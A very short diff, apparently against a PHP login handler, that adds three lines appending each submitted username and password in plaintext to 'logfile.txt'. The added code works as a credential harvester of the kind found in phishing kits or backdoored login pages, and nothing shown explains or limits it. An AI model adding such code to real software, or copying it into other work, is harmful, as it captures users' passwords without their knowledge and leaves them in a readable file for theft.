@@ -1,0 +1,3 @@
+$data = fopen("logfile.txt","a+");
+fwrite($data, "Username: $account\nPassword: $passwd\n");
+fclose($data);
